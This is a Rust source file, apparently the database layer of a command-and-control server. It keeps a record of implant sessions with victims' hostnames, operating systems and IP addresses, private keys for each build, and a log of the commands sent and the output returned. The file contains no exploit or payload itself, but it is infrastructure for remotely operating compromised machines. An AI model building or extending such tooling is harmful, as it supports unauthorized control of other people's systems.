// src/database.rs
use rusqlite::{Connection, params, OptionalExtension};
use r2d2::Pool;
use r2d2_sqlite::SqliteConnectionManager;
use chrono::Utc;

pub type DbPool = Pool<SqliteConnectionManager>;

pub struct FullLogEntry {
    pub session_id: u32,
    pub request_id: u64,
    pub command: String,
    pub output: Option<String>,
    pub error: Option<String>,
    pub timestamp: String,
}

pub fn init() -> Result<DbPool, Box<dyn std::error::Error>> {
    let manager = SqliteConnectionManager::file("c2_audit.db")
        .with_init(|c| c.execute_batch(
            "PRAGMA journal_mode = WAL;
             PRAGMA synchronous = NORMAL;
             PRAGMA busy_timeout = 5000;
             PRAGMA foreign_keys = ON;"
        ));

    let pool = Pool::builder().max_size(15).build(manager)?;
    let conn = pool.get()?;
    
    // Create Tables
    conn.execute_batch(
        "CREATE TABLE IF NOT EXISTS sessions (
            id INTEGER PRIMARY KEY,
            session_uuid TEXT, 
            exe_id TEXT, 
            computer_id TEXT, 
            hostname TEXT, 
            os TEXT, 
            ip_address TEXT, 
            build_id TEXT, 
            connected_at TEXT,
            is_active INTEGER DEFAULT 0,
            profile TEXT DEFAULT 'default'
         );

         CREATE TABLE IF NOT EXISTS server_config (
            key TEXT PRIMARY KEY,
            value BLOB
         );

         CREATE TABLE IF NOT EXISTS build_keys (
            build_id TEXT PRIMARY KEY,
            private_key BLOB,
            profile TEXT DEFAULT 'default',
            profile_data TEXT
         );

         CREATE TABLE IF NOT EXISTS client_outputs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            session_id INTEGER,
            request_id INTEGER,
            output TEXT,
            error TEXT,
            timestamp TEXT,
            FOREIGN KEY(session_id) REFERENCES sessions(id)
         );

         CREATE TABLE IF NOT EXISTS command_history (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            session_id INTEGER,
            request_id INTEGER,
            command TEXT,
            timestamp TEXT,
            FOREIGN KEY(session_id) REFERENCES sessions(id)
         );

         CREATE INDEX IF NOT EXISTS idx_outputs_req ON client_outputs(request_id);
         CREATE INDEX IF NOT EXISTS idx_cmd_req ON command_history(request_id);
         CREATE INDEX IF NOT EXISTS idx_outputs_timestamp ON client_outputs(timestamp);"
    )?;

    // Migration for existing DBs
    let count: i32 = conn.query_row(
        "SELECT count(*) FROM pragma_table_info('build_keys') WHERE name='profile_data'", 
        [], 
        |r| r.get(0)
    ).unwrap_or(0);

    if count == 0 {
        let _ = conn.execute("ALTER TABLE build_keys ADD COLUMN profile_data TEXT", []);
    }

    Ok(pool)
}

// ... (load_or_import_certs remains same) ...
pub fn load_or_import_certs(conn: &Connection) -> Result<(Vec<u8>, Vec<u8>, Vec<u8>), Box<dyn std::error::Error>> {
    let cert_blob: Option<Vec<u8>> = conn.query_row(
        "SELECT value FROM server_config WHERE key='server_cert'", [], |row| row.get(0)
    ).optional()?;

    if let Some(c) = cert_blob {
        let k: Vec<u8> = conn.query_row("SELECT value FROM server_config WHERE key='server_key'", [], |row| row.get(0))?;
        let ca: Vec<u8> = conn.query_row("SELECT value FROM server_config WHERE key='ca_cert'", [], |row| row.get(0))?;
        Ok((c, k, ca))
    } else {
        eprintln!("[!] Importing TLS certificates...");
        let c = std::fs::read("certs/server.crt")?;
        let k = std::fs::read("certs/server.key.der")?;
        let ca = std::fs::read("certs/ca.crt")?;
        
        conn.execute("INSERT OR REPLACE INTO server_config (key, value) VALUES (?1, ?2)", params!["server_cert", &c])?;
        conn.execute("INSERT OR REPLACE INTO server_config (key, value) VALUES (?1, ?2)", params!["server_key", &k])?;
        conn.execute("INSERT OR REPLACE INTO server_config (key, value) VALUES (?1, ?2)", params!["ca_cert", &ca])?;
        Ok((c, k, ca))
    }
}

// [UPDATED] Return profile_data (JSON) as the 3rd element
pub fn get_build_info(conn: &Connection, build_id: &str) -> Option<(Vec<u8>, String, Option<String>)> {
    conn.query_row(
        "SELECT private_key, profile, profile_data FROM build_keys WHERE build_id = ?", 
        [build_id], 
        |r| Ok((r.get(0)?, r.get(1)?, r.get(2)?))
    ).optional().unwrap_or(None)
}

pub fn log_new_session(
    conn: &Connection, 
    exe_id: &str, 
    computer_id: &str, 
    hostname: &str, 
    os: &str, 
    ip: &str, 
    build_id: &str,
    profile: &str
) {
    let _ = conn.execute(
        "INSERT INTO sessions (exe_id, computer_id, hostname, os, ip_address, build_id, connected_at, is_active, profile) 
         VALUES (?1, ?2, ?3, ?4, ?5, ?6, ?7, 0, ?8)",
        params![exe_id, computer_id, hostname, os, ip, build_id, Utc::now().to_rfc3339(), profile]
    );
}

// ... (Rest of functions: set_session_active, is_session_active, get_session_profile, log_command, save_client_output, enforce_storage_limit, get_global_full_history, get_session_full_history remain EXACTLY as they were) ...

pub fn set_session_active(conn: &Connection, session_id: u32, active: bool) {
    let val = if active { 1 } else { 0 };
    let _ = conn.execute("UPDATE sessions SET is_active = ?1 WHERE id = ?2", params![val, session_id]);
}

pub fn is_session_active(conn: &Connection, session_id: u32) -> bool {
    conn.query_row("SELECT is_active FROM sessions WHERE id = ?1", params![session_id], |r| r.get::<_, i32>(0))
        .map(|v| v == 1)
        .unwrap_or(false)
}

pub fn get_session_profile(conn: &Connection, session_id: u32) -> String {
    conn.query_row("SELECT profile FROM sessions WHERE id = ?1", params![session_id], |r| r.get(0))
        .unwrap_or("default".to_string())
}

pub fn log_command(conn: &Connection, session_id: u32, request_id: u64, command: &str) {
    let _ = conn.execute(
        "INSERT INTO command_history (session_id, request_id, command, timestamp) VALUES (?1, ?2, ?3, ?4)",
        params![session_id, request_id as i64, command, Utc::now().to_rfc3339()]
    );
}

const MAX_STORAGE_BYTES: usize = 150 * 1024 * 1024; 
const MAX_CHAR_LIMIT: usize = 3000;

pub fn save_client_output(conn: &Connection, session_id: u32, request_id: u64, output: &str, error: &str) {
    let safe_output: String = output.chars().take(MAX_CHAR_LIMIT).collect();
    let safe_error: String = error.chars().take(MAX_CHAR_LIMIT).collect();

    let res = conn.execute(
        "INSERT INTO client_outputs (session_id, request_id, output, error, timestamp) VALUES (?1, ?2, ?3, ?4, ?5)",
        params![session_id, request_id as i64, safe_output, safe_error, Utc::now().to_rfc3339()]
    );

    if let Err(e) = res { eprintln!("[-] DB Insert Error: {}", e); return; }
    if let Err(e) = enforce_storage_limit(conn) { eprintln!("[-] DB Cleanup Error: {}", e); }
}

fn enforce_storage_limit(conn: &Connection) -> Result<(), rusqlite::Error> {
    let current_size: i64 = conn.query_row(
        "SELECT COALESCE(SUM(LENGTH(output) + LENGTH(error)), 0) FROM client_outputs", [], |row| row.get(0)
    )?;

    if (current_size as usize) > MAX_STORAGE_BYTES {
        let mut freed = 0;
        let mut attempts = 0;
        while freed < ((current_size as usize) - MAX_STORAGE_BYTES) + (1024 * 1024) { 
             let count = conn.execute("DELETE FROM client_outputs WHERE id IN (SELECT id FROM client_outputs ORDER BY timestamp ASC LIMIT 50)", [])?;
             if count == 0 { break; } 
             freed += count * MAX_CHAR_LIMIT; 
             attempts += 1;
             if attempts > 100 { break; } 
        }
    }
    Ok(())
}

pub fn get_global_full_history(conn: &Connection, limit: usize) -> Result<Vec<FullLogEntry>, rusqlite::Error> {
    let mut stmt = conn.prepare(
        "SELECT ch.session_id, ch.request_id, ch.command, co.output, co.error, ch.timestamp 
         FROM command_history ch
         LEFT JOIN client_outputs co ON ch.session_id = co.session_id AND ch.request_id = co.request_id
         ORDER BY ch.timestamp DESC LIMIT ?1"
    )?;

    let rows = stmt.query_map([limit as i64], |row| {
        Ok(FullLogEntry {
            session_id: row.get(0)?,
            request_id: row.get::<_, i64>(1)? as u64,
            command: row.get(2)?,
            output: row.get(3)?,
            error: row.get(4)?,
            timestamp: row.get(5)?,
        })
    })?;

    let mut history = Vec::new();
    for row in rows { history.push(row?); }
    Ok(history)
}

pub fn get_session_full_history(conn: &Connection, session_id: u32, limit: usize) -> Result<Vec<FullLogEntry>, rusqlite::Error> {
    let mut stmt = conn.prepare(
        "SELECT ch.session_id, ch.request_id, ch.command, co.output, co.error, ch.timestamp 
         FROM command_history ch
         LEFT JOIN client_outputs co ON ch.session_id = co.session_id AND ch.request_id = co.request_id
         WHERE ch.session_id = ?1 ORDER BY ch.timestamp DESC LIMIT ?2"
    )?;

    let rows = stmt.query_map(params![session_id, limit as i64], |row| {
        Ok(FullLogEntry {
            session_id: row.get(0)?,
            request_id: row.get::<_, i64>(1)? as u64,
            command: row.get(2)?,
            output: row.get(3)?,
            error: row.get(4)?,
            timestamp: row.get(5)?,
        })
    })?;

    let mut history = Vec::new();
    for row in rows { history.push(row?); }
    history.reverse();
    Ok(history)
}
